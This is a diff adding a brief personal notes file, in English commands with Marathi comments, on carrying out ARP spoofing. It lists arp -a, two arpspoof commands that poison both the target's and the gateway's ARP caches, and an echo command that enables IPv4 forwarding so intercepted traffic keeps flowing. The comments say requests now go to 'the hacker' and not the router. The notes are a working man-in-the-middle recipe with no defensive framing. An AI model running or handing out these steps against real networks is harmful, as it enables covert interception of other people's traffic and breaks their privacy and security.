@@ -1,0 +1,21 @@
+ARP SPOOFING
+
+arp -a
+gateway disel nantr 
+window 1 madhe
+arpspoof -i wlan0 -t ""ip of target "" "" ip of default gateway""  <- fool the target<i am the router
+
+
+window 2 madhe 
+arpspoof -i wlan0 -t "" ip of default gateway "" ""ip of target""<-i am the victum  <-fool the router
+
+
+
+ata je request astat tya direct router la nahi jaat 
+tya yetet hacker laaa
+mahnun ata ek security feacture astat je ki tya packets la reject karun takata
+mahnun apalala tyala enable karawa lagta
+
+enable port forwarding
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
